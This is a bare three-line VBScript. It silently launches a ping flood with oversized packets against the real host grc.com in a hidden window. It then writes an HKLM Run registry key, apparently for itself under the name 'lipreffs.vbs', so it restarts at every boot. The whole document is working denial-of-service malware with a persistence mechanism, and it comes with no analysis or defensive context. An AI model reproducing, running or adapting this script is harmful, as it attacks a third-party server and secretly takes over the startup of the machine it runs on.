Set ws = CreateObject("Wscript.shell")
ws.run "ping -n 99999999999999999999999999 -l 46213 -w 0 grc.com ",0,false
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\jb", "lipreffs.vbs"
